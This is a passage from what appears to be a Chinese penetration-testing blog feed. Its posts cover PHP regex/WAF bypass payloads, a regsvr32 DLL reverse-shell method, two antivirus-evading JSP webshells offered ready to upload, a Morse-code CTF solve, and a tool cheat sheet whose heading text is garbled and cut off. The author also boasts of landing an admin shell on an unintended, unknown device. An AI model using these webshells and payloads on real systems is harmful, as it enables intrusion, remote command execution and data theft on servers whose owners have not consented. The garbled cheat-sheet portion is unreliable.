_=<span class="title function_ invoke__">phpinfo</span>();</span><br><span class="line"><span class="comment">//密码是：_</span></span><br></pre></td></tr></table></figure><h1 id="上传临时文件"><a href="#上传临时文件" class="headerlink" title="上传临时文件"></a>上传临时文件</h1><p>这里给出payload，不在赘述，具体原理参考：<a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html">https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="comment">#author yu22x</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url=<span class="string">&quot;http://xxx/test.php?code=?&gt;&lt;?=`. /???/????????[@-[]`;?&gt;&quot;</span></span><br><span class="line">files=&#123;<span class="string">&#x27;file&#x27;</span>:<span class="string">&#x27;cat f*&#x27;</span>&#125;</span><br><span class="line">response=requests.post(url,files=files)</span><br><span class="line">html = response.text</span><br><span class="line"><span class="built_in">print</span>(html)</span><br></pre></td></tr></table></figure><h1 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h1><h2 id="数组绕过"><a href="#数组绕过" class="headerlink" title="数组绕过"></a>数组绕过</h2><p>代码的第二行更换参数，把传入的代码从字符串形式改为数组形式，通常是以下三种形式~</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$a</span>[]=<span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">array</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"><span class="variable">$a</span>=[<span class="string">&#x27;flag.php&#x27;</span>];</span><br></pre></td></tr></table></figure><p>注意以下第三行$a&#x3D;[‘flag.php’];，粗心的小白不要像我一样写成$a&#x3D;’[flag.php]’;这样，会被判定成字符串的，导致绕过失败的…</p><h2 id="命名空间绕过"><a href="#命名空间绕过" class="headerlink" title="命名空间绕过"></a>命名空间绕过</h2><p><img src="/images/phppreg/fuckpreg2.JPG"><br>偷一下懒</p><h2 id="其他-1"><a href="#其他-1" class="headerlink" title="其他"></a>其他</h2><p>除这些之外我们还可以这样用</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;%<span class="number">86</span>%<span class="number">86</span>%<span class="number">86</span>%<span class="number">86</span>^%d9%c1%c3%d2&#125;&#123;%<span class="number">86</span>&#125;();&amp;%<span class="number">86</span>=phpinfo</span><br></pre></td></tr></table></figure><p>其中</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%<span class="number">86</span>%<span class="number">86</span>%<span class="number">86</span>%<span class="number">86</span>^%d9%c1%c3%d2</span><br></pre></td></tr></table></figure><p>为构造出的_GET，适合于过滤了引号的情况下使用。</p><hr><p>参考链接：<br><a href="https://endermanneer.github.io/2023/12/09/CTF/%E7%BB%95%E8%BF%87%E6%AD%A3%E5%88%99/">https://endermanneer.github.io/2023/12/09/CTF/绕过正则/</a><br><a href="https://blog.csdn.net/mochu7777777/article/details/104631142">https://blog.csdn.net/mochu7777777/article/details/104631142</a><br><a href="https://blog.csdn.net/miuzzx/article/details/109143413">https://blog.csdn.net/miuzzx/article/details/109143413</a><br><a href="https://blog.csdn.net/qq_45521281/article/details/105656936">https://blog.csdn.net/qq_45521281/article/details/105656936</a><br><a href="https://zhuanlan.zhihu.com/p/391439312">https://zhuanlan.zhihu.com/p/391439312</a></p><p>这篇文章真的拖了好久现在都2024了:(</p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
          <category> Web </category>
          
          <category> 代码审计 </category>
          
          <category> PHP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
            <tag> 渗透测试 </tag>
            
            <tag> 代码审计 </tag>
            
            <tag> WAF绕过 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>奇技淫巧-dll乱弹shell</title>
      <link href="/2023/12/10/shitsheet2/"/>
      <url>/2023/12/10/shitsheet2/</url>
      
        <content type="html"><![CDATA[<h1 id="简述"><a href="#简述" class="headerlink" title="简述"></a>简述</h1><p>最近在渗透一台比较老，环境比较不完整的机子时，尝试反弹shell出了很多乱七八糟的问题，在尝试nc，msf等常规上传方法失败后，找到一种小众的方法，通过windows自带的regsvr32反注册dll文件来坦shell，用nc连接</p><h1 id="具体方法"><a href="#具体方法" class="headerlink" title="具体方法"></a>具体方法</h1><p>先下载这个MFC服务配置端：<br><a href="/files/MFC.exe">MFC服务配置端口</a><br>首先我们先在这个MFC服务配置端里根据目标的架构生成dll文件：<br><img src="/images/shitsheet2/ss2-1.JPG"><br>ip地址填自己的ip，端口号选择一个喜欢的，其他信息随便填（不填也可以），下面根据架构，点击生成dll文件<br>在本地开启nc的端口监听，将dll上传到目标机器，使用指令：</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">regsvr32 /s /u 你上传的server.dll文件</span><br></pre></td></tr></table></figure><p>来反弹shell，当nc有反应，就代表连接成功</p><h1 id="吐槽"><a href="#吐槽" class="headerlink" title="吐槽"></a>吐槽</h1><p>我用这个方法，虽然成功反弹了shell，但神奇的是，反弹的不是我上传的目标机器的shell，而是反弹了一台不知道是什么设备的shell，而且里面还有重要文件，权限也是admin，赚麻了，也怕了。十分恶心的是，这个shell不仅10秒断一次，而且每次重连还要换端口，恶心人有个度啊。</p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
          <category> 奇技淫巧 </category>
          
          <category> Web </category>
          
          <category> Getshell </category>
          
          <category> Web Shell </category>
          
          <category> LAN Network </category>
          
          <category> Shell </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 奇技淫巧 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>奇技淫巧-更适合蚁剑宝宝的免杀jsp一句话</title>
      <link href="/2023/12/10/shitsheet1/"/>
      <url>/2023/12/10/shitsheet1/</url>
      
        <content type="html"><![CDATA[<h1 id="简述"><a href="#简述" class="headerlink" title="简述"></a>简述</h1><p>最近在渗透的时候遇到需要上传jsp一句话的情况，因为目标机器有360，而且比较老旧，很多jsp一句话不是被杀就是跑不了，更有甚者上传了能执行但是连不上蚁剑，后来获取了两个不错的马，记录一下</p><h1 id="免杀连接蚁剑jsp"><a href="#免杀连接蚁剑jsp" class="headerlink" title="免杀连接蚁剑jsp"></a>免杀连接蚁剑jsp</h1><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%!<span class="keyword">class</span> <span class="title class_">AFKZ</span> <span class="keyword">extends</span> <span class="title class_">ClassLoader</span>&#123; AFKZ(ClassLoader NGOK)&#123; <span class="built_in">super</span>(NGOK); &#125;<span class="keyword">public</span> Class <span class="title function_">g</span><span class="params">(<span class="type">byte</span> []b)</span>&#123; <span class="keyword">return</span> <span class="built_in">super</span>.defineClass(b,<span class="number">0</span>,b.length); &#125;&#125;%&gt;&lt;% String cls=request.getParameter(<span class="string">&quot;bypass&quot;</span>);<span class="keyword">if</span>(cls!=<span class="literal">null</span>)&#123; <span class="keyword">new</span> <span class="title class_">AFKZ</span>(<span class="built_in">this</span>.getClass().getClassLoader()).g(<span class="keyword">new</span> <span class="title class_">sun</span>.misc.BASE64Decoder().decodeBuffer(cls)).newInstance().equals(pageContext); &#125;%&gt;</span><br></pre></td></tr></table></figure><p>这款比较适合旧的机子，而且蚁剑能连上<br>密码：bypass</p><h1 id="普通免杀jsp"><a href="#普通免杀jsp" class="headerlink" title="普通免杀jsp"></a>普通免杀jsp</h1><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page language=<span class="string">&quot;java&quot;</span> pageEncoding=<span class="string">&quot;UTF-8&quot;</span> %&gt;</span><br><span class="line">&lt;%</span><br><span class="line">    <span class="type">String</span> <span class="variable">PASSWORD</span> <span class="operator">=</span> <span class="string">&quot;password&quot;</span>;</span><br><span class="line">    <span class="type">String</span> <span class="variable">passwd</span> <span class="operator">=</span> request.getParameter(<span class="string">&quot;pwd&quot;</span>);</span><br><span class="line">    <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> request.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">    <span class="type">Class</span> <span class="variable">rt</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>);</span><br><span class="line">    java.lang.reflect.<span class="type">Method</span> <span class="variable">gr</span> <span class="operator">=</span> rt.getMethod(<span class="string">&quot;getRuntime&quot;</span>);</span><br><span class="line">    java.lang.reflect.<span class="type">Method</span> <span class="variable">ex</span> <span class="operator">=</span> rt.getMethod(<span class="string">&quot;exec&quot;</span>, String.class);</span><br><span class="line">    <span class="type">Process</span> <span class="variable">process</span> <span class="operator">=</span> (Process) ex.invoke(gr.invoke(<span class="literal">null</span>), cmd);</span><br><span class="line">    java.io.<span class="type">InputStream</span> <span class="variable">in</span> <span class="operator">=</span> process.getInputStream();</span><br><span class="line">    out.print(<span class="string">&quot;&lt;pre&gt;&quot;</span>);</span><br><span class="line">    java.io.<span class="type">InputStreamReader</span> <span class="variable">resultReader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">java</span>.io.InputStreamReader(in);</span><br><span class="line">    java.io.<span class="type">BufferedReader</span> <span class="variable">stdInput</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">java</span>.io.BufferedReader(resultReader);</span><br><span class="line">    <span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">while</span> ((s = stdInput.readLine()) != <span class="literal">null</span>) &#123;</span><br><span class="line">        out.println(s);</span><br><span class="line">    &#125;</span><br><span class="line">    out.print(<span class="string">&quot;&lt;/pre&gt;&quot;</span>);</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><p>这款比较普通，密码：cmd<br>xxx.jsp?cmd&#x3D;你想执行的代码</p><hr><p><strong>碎碎念</strong><br>好久没归纳了，感觉要被大家超过了</p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
          <category> 奇技淫巧 </category>
          
          <category> Web </category>
          
          <category> Getshell </category>
          
          <category> Web Shell </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 奇技淫巧 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Classical Crypto-喵喵喵？</title>
      <link href="/2023/10/22/miao/"/>
      <url>/2023/10/22/miao/</url>
      
        <content type="html"><![CDATA[<h1 id="题目简述"><a href="#题目简述" class="headerlink" title="题目简述"></a>题目简述</h1><p>题目给了一个文本文件，里面都是喵喵喵，内容如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">喵喵？ 喵喵喵喵喵喵喵喵喵喵喵喵 喵喵喵 喵喵喵喵喵喵喵喵？喵喵？喵喵喵喵喵？ 喵喵？喵喵喵喵喵？ 喵喵喵喵喵？ 喵喵喵喵喵？喵喵？ 喵喵喵喵喵？ 喵喵喵喵喵喵 喵喵喵喵喵喵 喵喵喵喵喵喵喵喵？喵喵？喵喵喵喵喵？ 喵喵？喵喵喵喵喵？喵喵喵 喵喵喵喵喵？ 喵喵？ 喵喵喵喵喵喵喵喵？喵喵？喵喵喵喵喵？ 喵喵？喵喵喵喵喵喵喵喵喵 喵喵喵喵喵喵喵喵？ 喵喵？ 喵喵喵喵喵喵喵喵？喵喵？喵喵喵喵喵？ 喵喵？喵喵喵喵喵喵喵喵喵 喵喵喵 喵喵喵喵喵喵喵喵？喵喵？喵喵喵喵喵？ 喵喵？喵喵喵喵喵？喵喵喵 喵喵喵喵喵？ 喵喵喵喵喵？喵喵喵喵喵喵 喵喵喵喵喵？喵喵喵喵喵喵 喵喵喵 喵喵？喵喵喵喵喵喵 喵喵喵喵喵喵喵喵？喵喵？喵喵喵喵喵？ 喵喵？喵喵？喵喵喵 喵喵？喵喵？喵喵？ 喵喵喵喵喵喵喵喵？ 喵喵？喵喵？喵喵喵喵喵喵 喵喵喵喵喵喵 喵喵喵喵喵喵喵喵？喵喵？喵喵喵喵喵？ 喵喵？喵喵喵喵喵喵喵喵喵 喵喵？喵喵喵喵喵？喵喵？ 喵喵喵喵喵喵喵喵？喵喵？喵喵喵喵喵？ 喵喵喵喵喵？喵喵喵 喵喵？喵喵喵喵喵喵喵喵？</span><br></pre></td></tr></table></figure><h1 id="猜想"><a href="#猜想" class="headerlink" title="猜想"></a>猜想</h1><p>“喵喵？”出现了很多次，根据题目信息，这是莫斯电码，也就是说明“喵喵？”要么是点要么是横，同时我们猜想，“喵喵？”有三个字，那么三个“喵”在一起组成的“喵喵喵”有没有可能是另一个符号呢？</p><h1 id="编写POC"><a href="#编写POC" class="headerlink" title="编写POC"></a>编写POC</h1><p>写一个程序，先尝试将“喵喵？”换成横，“喵喵喵“换成点：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># encoding=utf-8</span></span><br><span class="line">a = <span class="string">&quot;喵喵？ 喵喵喵喵喵喵喵喵喵喵喵喵 喵喵喵 喵喵喵喵喵喵喵喵？喵喵？喵喵喵喵喵？ 喵喵？喵喵喵喵喵？ 喵喵喵喵喵？ 喵喵喵喵喵？喵喵？ 喵喵喵喵喵？ 喵喵喵喵喵喵 喵喵喵喵喵喵 喵喵喵喵喵喵喵喵？喵喵？喵喵喵喵喵？ 喵喵？喵喵喵喵喵？喵喵喵 喵喵喵喵喵？ 喵喵？ 喵喵喵喵喵喵喵喵？喵喵？喵喵喵喵喵？ 喵喵？喵喵喵喵喵喵喵喵喵 喵喵喵喵喵喵喵喵？ 喵喵？ 喵喵喵喵喵喵喵喵？喵喵？喵喵喵喵喵？ 喵喵？喵喵喵喵喵喵喵喵喵 喵喵喵 喵喵喵喵喵喵喵喵？喵喵？喵喵喵喵喵？ 喵喵？喵喵喵喵喵？喵喵喵 喵喵喵喵喵？ 喵喵喵喵喵？喵喵喵喵喵喵 喵喵喵喵喵？喵喵喵喵喵喵 喵喵喵 喵喵？喵喵喵喵喵喵 喵喵喵喵喵喵喵喵？喵喵？喵喵喵喵喵？ 喵喵？喵喵？喵喵喵 喵喵？喵喵？喵喵？ 喵喵喵喵喵喵喵喵？ 喵喵？喵喵？喵喵喵喵喵喵 喵喵喵喵喵喵 喵喵喵喵喵喵喵喵？喵喵？喵喵喵喵喵？ 喵喵？喵喵喵喵喵喵喵喵喵 喵喵？喵喵喵喵喵？喵喵？ 喵喵喵喵喵喵喵喵？喵喵？喵喵喵喵喵？ 喵喵喵喵喵？喵喵喵 喵喵？喵喵喵喵喵喵喵喵？&quot;</span></span><br><span class="line">b = a.replace(<span class="string">&quot;喵喵？&quot;</span>,<span class="string">&quot;-&quot;</span>)</span><br><span class="line">c= b.replace(<span class="string">&quot;喵喵喵&quot;</span>,<span class="string">&quot;.&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(c)</span><br></pre></td></tr></table></figure><p>结果如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">- .... . ..--.- -.- .- .-- .- .. .. ..--.- -.-. .- - ..--.- -... ..- - ..--.- -... . ..--.- -.-. .- .-.. .-.. . -.. ..--.- --. --- ..- --.. .. ..--.- -... -.-- ..--.- .-. -..-</span><br></pre></td></tr></table></figure><h1 id="获取flag"><a href="#获取flag" class="headerlink" title="获取flag"></a>获取flag</h1><p>将这些莫斯电码翻译，得到如下信息：<br>THE_KAWAII_CAT_BUT_BE_CALLED_GOUZI_BY_RX<br>得到flag</p><h1 id="踩坑总结"><a href="#踩坑总结" class="headerlink" title="踩坑总结"></a>踩坑总结</h1><p>1.观察不够细致，没有观察到”喵喵？“的规律</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> 2023MoeCTF </category>
          
          <category> Classical Crypto </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Classical Crypto </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>速查</title>
      <link href="/2023/10/18/quickshit/"/>
      <url>/2023/10/18/quickshit/</url>
      
        <content type="html"><![CDATA[<h1 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h1><p><a href="#%E5%B7%A5%E5%85%B7%E7%BD%91%E7%AB%99">工具网站</a><br><a href="#%E5%AD%97%E5%85%B8">字典</a><br><a href="#%E5%B8%B8%E7%94%A8%E5%B7%A5%E5%85%B7">常用工具</a><br>    <a href="##sqlmap">sqlmap</a><br>    <a href="##dirsearch">dirsearch</a><br>    <a href="##githack">githack</a><br>    <a href="##wafninja">wafninja</a><br>    <a href="##searchsploit">searchsploit</a><br>    <a href="##tplmap">tplmap</a><br><a href="#%E5%B8%B8%E8%A7%81%E5%A4%87%E4%BB%BD%E6%96%87%E4%BB%B6">常见备份文件</a><br><a href="#%E4%B8%87%E8%83%BD%E5%AF%86%E7%A0%81">万能密码</a><br><a href="#%E4%B8%80%E5%8F%A5%E8%AF%9D%E5%A4%A7%E5%85%A8">一句话大全</a><br><a href="#%E7%AE%80%E6%98%93%E5%9B%BE%E7%89%87%E9%A9%AC">简易图片马</a><br><a href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%A7%BF%E5%8A%BF">文件上传</a><br><a href="#%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB">文件包含</a><br><a href="#%E4%BC%AA%E5%8D%8F%E8%AE%AE">伪协议</a></p><h1 id="反序列化-魔法函数-perg-match-绕过"><a href="#反序列化-魔法函数-perg-match-绕过" class="headerlink" title="反序列化 魔法函数 perg_match 绕过"></a>反序列化 魔法函数 perg_match 绕过</h1><p>反序列化的私有属性要在类名前后加%00，protected在变量名前添加标记\00<em>\00（%00</em>%00），然后urldecode后使用unserialize反序列化，最后使用var_dump输出<br>preg：<br><a href="https://blog.csdn.net/weixin_42789937/article/details/128667822">https://blog.csdn.net/weixin_42789937/article/details/128667822</a><br>魔法函数以及反序列化：<br><a href="https://blog.csdn.net/Reme_mber/article/details/124752229">https://blog.csdn.net/Reme_mber/article/details/124752229</a><br><a href="https://blog.csdn.net/solitudi/article/details/113588692">https://blog.csdn.net/solitudi/article/details/113588692</a><br>hustler0000.github.io<br>_wakeup可以通过改变O：后面的数字，使其与真实数量不符即可绕过</p><h1 id="工具网站"><a href="#工具网站" class="headerlink" title="工具网站"></a>工具网站</h1><p>ctf清单：<a href="https://ctf-wiki.org/">https://ctf-wiki.org/</a><br>在线ai1：<a href="https://my.aigcplus.io/home">https://my.aigcplus.io/home</a><br>文心一言：<a href="https://yiyan.baidu.com/welcome">https://yiyan.baidu.com/welcome</a><br>在线ai2：<a href="https://c.binjie.fun/#/chat/1697008440757">https://c.binjie.fun/#/chat/1697008440757</a><br>在线工具：<a href="https://ctf.bugku.com/tools">https://ctf.bugku.com/tools</a><br>在线代码执行：<a href="https://code.y444.cn/php">https://code.y444.cn/php</a><br>在线md5：<a href="https://cmd5.com/">https://cmd5.com/</a><br>在线反编译pyc：<a href="https://tool.lu/pyc/">https://tool.lu/pyc/</a><br>词频统计：<a href="https://quipqiup.com/">https://quipqiup.com/</a></p><hr><h1 id="字典"><a href="#字典" class="headerlink" title="字典"></a>字典</h1><p><a href="https://gitee.com/adminssssss/infiltration-dictionary">https://gitee.com/adminssssss/infiltration-dictionary</a><br><a href="https://blog.csdn.net/qq_46634561/article/details/120019738">https://blog.csdn.net/qq_46634561/article/details/120019738</a></p><hr><h1 id="常用工具"><a href="#常用工具" class="headerlink" title="常用工具"></a>常用工具</h1><h2 id="sqlmap"><a href="#sqlmap" class="headerlink" title="sqlmap"></a>sqlmap</h2><h1 id="sqlmap简介sqlmap是一款基于python编写的渗透测试工具，在sql检测和利用方面功能强大，支持多种数据库。-sqlmap常用命令-Target：-Request-Optimization-Injection-Detectiong-Techniques-Fingerprint-f-查询目标DBMS版本指纹信息-Emuneration-Brute-force-File-system-access-General-sqlmap注入技术简介-sqlmap获取目标方式-dirsearchpython-dirsearch-py-u-http-xxxx-日常使用python-dirsearch-py-u-http-xxxx-r-递归扫描，不过容易被检测python-dirsearch-py-u-http-xxxx-r-t-30-线程控制请求速率python-dirsearch-py-u-http-xxxx-r-t-30-–proxy-127-0-0-1-8080-使用代理-安装及简单使用pip3-install-r-requirements-txt-安装下需要的依赖python3-dirsearch-py-u-target-url-攻击目标url地址，可以用-u-参数指定多个-命令参数这个脚本很多功能参数，但能用到的可能比较少，几乎都有默认配置，在-default-conf-中可以看到-版本以及帮助命令–version-显示程序版本号并退出-h-显示帮助信息并退出-常用命令参数-u-攻击目标url地址，可以指定多个，通过逗号分隔-l-url列表文件，比如你可以建一个-targets-txt，里面包含需要攻击的网址-e-站点文件类型列表，如：php-asp，有默认配置：php-aspx-jsp-html-js，基本主流的格式都包含了-X-不需要扫描的站点文件类型列表-w-用指定爆破字典执行，若存在多个通过逗号分隔-t-指定线程数-i-仅现实指定的状态码，指定多个通过逗号分隔-x-不显示指定的状态码，指定多个通过逗号分隔–exclude-sizes-SIZES-不显示的响应包大小（Example-123B-4KB）–exclude-texts-TEXTS-不显示的响应包关键字-Example-“Not-found”-“Error”）-m-指定请求方式，默认GET-较为冷门配置–cidr-CIDR-无类域间路由CIDR–prefixes-PREFIXES-对字典中的每个项添加自定义前缀，比如字典中有个项是app，只要我指定-，那么就会爆破的字典项为-app、-app、-app，若存在多个通过逗号分隔–suffixes-SUFFIXES-添加自定义后缀，同上若存在多个通过逗号分隔-U-字典全部大写-L-字典全部小写-C-首字母大写-d-指定HTTP-request-data-H-设置HTTP请求头，Example-H-“Referer-example-com”-H-“Accept-“–random-user-agent-true-false-随机user-agent开关–user-agent-USERAGENT-自定义用户凭证，比如-Mozilla-5-0-Macintosh-Intel-Mac-OS-X-10-15-rv-97-0-Gecko-20100101-Firefox-97-0，可以伪造请求报文–cookie-COOKIE-可以设置访问cookie–exit-on-error-当出错直接关闭程序–timeout-TIMEOUT-访问超时设置-s-DELAY-–delay-DELAY-请求间隔延迟-s，支持浮点数-Delay-between-requests-support-float-number-–proxy-PROXY-指定访问代理，例如-localhost-8080-socks5-localhost-8088-输出报告格式–simple-report-OUTPUTFILE-简洁报告–plain-text-report-OUTPUTFILE-纯文本格式报告–json-report-OUTPUTFILE-json格式报告–xml-report-OUTPUTFILE-xml格式报告–markdown-report-OUTPUTFILE-markdown格式报告-githackpython2-githack-py-https-example-com-git-wafninja基于python2python-wafninja-py-fuzz-h-我们可以把fuzz-换成-bypass-insert-fuzz-insert-bypass-set-db-这几个关键词，便可以查看相对应的帮助信息。-Fuzz是什么？Generally-speaking-fuzz-is-a-brute-force-method-which-used-to-break-software，就是用大量的测试用例一个一个试，尽可能多的找出有可能出问题的地方。bypass就是绕过。-使用示例fuzz（模糊测试）-python-wafninja-py-fuzz-u-“http-www-target-com-index-php-id-FUZZ“-c-“phpsessid-value”-t-xss-o-output-htmlbypass（绕过WAF）-python-wafninja-py-bypass-u-“http-www-target-com-index-php“-p-“Name-PAYLOAD-Submit-Submit”-c-“phpsessid-value”-t-xss-o-output-htmlinsert-fuzz（用户自定义模糊测试载荷）-python-wafninja-py-insert-fuzz-i-select-e-select-t-sql-参数介绍其他参数：-fuzz-bypass-insert-fuzz-insert-bypass-set-db-fuzz-检查WAF允许通过的符号和关键词。-bypass-从数据库中发送载荷到目标。insert-fuzz-添加一个模糊字符串。insert-bypass-添加一个载荷到绕过列表。set-db-设置另外一个数据库文件。对于别人分享的相同载荷数据库时，这个特别有用。可选参数：-h-—help-显示帮助信息并且退出。-u-URL-目标URL（例如：-“www-target-com-index-php-id-FUZZ”-注意：用关键词FUZZ来指定模糊测试的位置。-p-POST-PARAMETER-通过post参数发送模糊测试载荷-Send-fuzz-through-post-parameter-c-COOKIE-HTTP-Cookie-头部-t-TYPE-载荷的类型-sql-xss-d-DELAY-每个请求的等待时间。默认是0秒-o-OUTPUT-FILE-保存输出到html-文件—proxy-PROXY-使用代理；Use-a-proxy-Format-IP-PORT—prefix-PROXY-增加前缀；Add-a-prefix-to-every-fuzz-—postfix-PROXY-增加postfix；Add-a-postfix-to-every-fuzz-w-WAF-发送特定WAF的有效载荷；Send-payloads-of-certain-WAF-default-generic-e-EXPECTED-目标站点的预期输出。如果输入是编码的或类似的，请使用此选项。-p-PATH-sqlite数据库的路径。默认位置为“db-db-sqlite”-searchsploithttps-www-exploit-db-com-searchsploit语法Usage-searchsploit-options-term1-term2-…-termN"><a href="#sqlmap简介sqlmap是一款基于python编写的渗透测试工具，在sql检测和利用方面功能强大，支持多种数据库。-sqlmap常用命令-Target：-Request-Optimization-Injection-Detectiong-Techniques-Fingerprint-f-查询目标DBMS版本指纹信息-Emuneration-Brute-force-File-system-access-General-sqlmap注入技术简介-sqlmap获取目标方式-dirsearchpython-dirsearch-py-u-http-xxxx-日常使用python-dirsearch-py-u-http-xxxx-r-递归扫描，不过容易被检测python-dirsearch-py-u-http-xxxx-r-t-30-线程控制请求速率python-dirsearch-py-u-http-xxxx-r-t-30-–proxy-127-0-0-1-8080-使用代理-安装及简单使用pip3-install-r-requirements-txt-安装下需要的依赖python3-dirsearch-py-u-target-url-攻击目标url地址，可以用-u-参数指定多个-命令参数这个脚本很多功能参数，但能用到的可能比较少，几乎都有默认配置，在-default-conf-中可以看到-版本以及帮助命令–version-显示程序版本号并退出-h-显示帮助信息并退出-常用命令参数-u-攻击目标url地址，可以指定多个，通过逗号分隔-l-url列表文件，比如你可以建一个-targets-txt，里面包含需要攻击的网址-e-站点文件类型列表，如：php-asp，有默认配置：php-aspx-jsp-html-js，基本主流的格式都包含了-X-不需要扫描的站点文件类型列表-w-用指定爆破字典执行，若存在多个通过逗号分隔-t-指定线程数-i-仅现实指定的状态码，指定多个通过逗号分隔-x-不显示指定的状态码，指定多个通过逗号分隔–exclude-sizes-SIZES-不显示的响应包大小（Example-123B-4KB）–exclude-texts-TEXTS-不显示的响应包关键字-Example-“Not-found”-“Error”）-m-指定请求方式，默认GET-较为冷门配置–cidr-CIDR-无类域间路由CIDR–prefixes-PREFIXES-对字典中的每个项添加自定义前缀，比如字典中有个项是app，只要我指定-，那么就会爆破的字典项为-app、-app、-app，若存在多个通过逗号分隔–suffixes-SUFFIXES-添加自定义后缀，同上若存在多个通过逗号分隔-U-字典全部大写-L-字典全部小写-C-首字母大写-d-指定HTTP-request-data-H-设置HTTP请求头，Example-H-“Referer-example-com”-H-“Accept-“–random-user-agent-true-false-随机user-agent开关–user-agent-USERAGENT-自定义用户凭证，比如-Mozilla-5-0-Macintosh-Intel-Mac-OS-X-10-15-rv-97-0-Gecko-20100101-Firefox-97-0，可以伪造请求报文–cookie-COOKIE-可以设置访问cookie–exit-on-error-当出错直接关闭程序–timeout-TIMEOUT-访问超时设置-s-DELAY-–delay-DELAY-请求间隔延迟-s，支持浮点数-Delay-between-requests-support-float-number-–proxy-PROXY-指定访问代理，例如-localhost-8080-socks5-localhost-8088-输出报告格式–simple-report-OUTPUTFILE-简洁报告–plain-text-report-OUTPUTFILE-纯文本格式报告–json-report-OUTPUTFILE-json格式报告–xml-report-OUTPUTFILE-xml格式报告–markdown-report-OUTPUTFILE-markdown格式报告-githackpython2-githack-py-https-example-com-git-wafninja基于python2python-wafninja-py-fuzz-h-我们可以把fuzz-换成-bypass-insert-fuzz-insert-bypass-set-db-这几个关键词，便可以查看相对应的帮助信息。-Fuzz是什么？Generally-speaking-fuzz-is-a-brute-force-method-which-used-to-break-software，就是用大量的测试用例一个一个试，尽可能多的找出有可能出问题的地方。bypass就是绕过。-使用示例fuzz（模糊测试）-python-wafninja-py-fuzz-u-“http-www-target-com-index-php-id-FUZZ“-c-“phpsessid-value”-t-xss-o-output-htmlbypass（绕过WAF）-python-wafninja-py-bypass-u-“http-www-target-com-index-php“-p-“Name-PAYLOAD-Submit-Submit”-c-“phpsessid-value”-t-xss-o-output-htmlinsert-fuzz（用户自定义模糊测试载荷）-python-wafninja-py-insert-fuzz-i-select-e-select-t-sql-参数介绍其他参数：-fuzz-bypass-insert-fuzz-insert-bypass-set-db-fuzz-检查WAF允许通过的符号和关键词。-bypass-从数据库中发送载荷到目标。insert-fuzz-添加一个模糊字符串。insert-bypass-添加一个载荷到绕过列表。set-db-设置另外一个数据库文件。对于别人分享的相同载荷数据库时，这个特别有用。可选参数：-h-—help-显示帮助信息并且退出。-u-URL-目标URL（例如：-“www-target-com-index-php-id-FUZZ”-注意：用关键词FUZZ来指定模糊测试的位置。-p-POST-PARAMETER-通过post参数发送模糊测试载荷-Send-fuzz-through-post-parameter-c-COOKIE-HTTP-Cookie-头部-t-TYPE-载荷的类型-sql-xss